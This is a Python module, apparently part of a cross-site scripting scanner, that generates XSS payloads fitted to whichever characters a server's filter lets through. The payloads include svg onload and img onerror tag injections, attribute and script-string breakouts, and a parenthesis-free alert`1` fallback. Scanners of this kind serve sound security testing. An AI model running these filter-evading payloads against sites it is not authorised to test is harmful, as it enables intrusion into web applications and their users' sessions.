"""Generative payload builder (Phase 32, XSStrike-inspired).

A payload corpus is static, but the filter is dynamic.  Instead of only
retrieving corpus entries, this module CONSTRUCTS payloads from the
reflection profile (Phase 31) so every generated payload uses ONLY
characters the server let through -- they can slip past the exact filter
that blocks the corpus entries.

Examples of the rules:
  * ``< >`` survive      -> tag injection (slash/space separators per profile)
  * quotes survive only  -> attribute-value breakout with the alive quote
  * ``=`` survives only  -> no-quote attribute injection
  * ``( )`` stripped     -> the call becomes alert`1` (tagged template,
                            executed via verifier.mark's backtick support)

Output dicts follow the corpus shape (context/payload/tags/confidence/note)
so prioritization, transform chains and semantic verification all work
unchanged.  The scanner puts generated payloads at the FRONT of the L1
queue (dedup'd against the corpus).
"""
from __future__ import annotations

# Executable call forms.  alert`1` (tagged template) executes without
# parentheses -- it is the fallback when ( ) are stripped/encoded.
_CALL_PARENS = "alert(1)"
_CALL_TAGGED = "alert`1`"


def _call(kept: set[str]) -> str:
    return _CALL_PARENS if ("(" in kept and ")" in kept) else _CALL_TAGGED


def generate(profile: dict, context: str) -> list[dict]:
    """Build payloads from the surviving characters for this context.

    Returns [] when the reflection is complete (corpus order is already
    optimal) or when no generation rule matches the context/character set.
    """
    if not profile or profile.get("full_reflection"):
        return []
    kept = set(profile.get("chars_kept", []))
    call = _call(kept)
    raw: list[str] = []

    if context in ("html_element", "svg_context", "math_context"):
        if "<" in kept and ">" in kept:
            if "/" in kept:
                raw.append(f"<svg/onload={call}>")
                raw.append(f"<img/src=x/onerror={call}>")
            raw.append(f"<svg onload={call}>")
            raw.append(f"<img src=x onerror={call}>")
        elif '"' in kept or "'" in kept:
            # Tags are gone but quotes survive: break out of the attribute
            # value instead of the element.
            q = '"' if '"' in kept else "'"
            raw.append(f"{q} onmouseover={call} x={q}")
            raw.append(f"{q} autofocus onfocus={call} x={q}")
        elif "=" in kept:
            # Unquoted attribute value: space-separated injection.
            raw.append(f" onfocus={call} x=")
    elif context.startswith("html_attribute") or context == "event_handler":
        if '"' in kept or "'" in kept:
            q = '"' if '"' in kept else "'"
            raw.append(f"{q} onmouseover={call} x={q}")
            raw.append(f"{q} autofocus onfocus={call} x={q}")
        elif "<" in kept and ">" in kept:
            # Quotes gone but tags survive: close the attribute's tag.
            raw.append(f"><svg onload={call}><")
        elif "=" in kept:
            raw.append(f" onfocus={call} x=")
    elif context.startswith("script_"):
        if context == "script_block":
            if "(" in kept and ")" in kept:
                raw.append(call)
        else:
            # String breakout with whichever quote survived.
            for q in ('"', "'", "`"):
                if q in kept:
                    raw.append(f"{q};{call};//")
                    break

    return [{
        "context": context,
        "payload": p,
        "tags": ["generated"],
        "confidence": "medium",
        "note": "generated from reflection profile (surviving chars only)",
    } for p in raw]
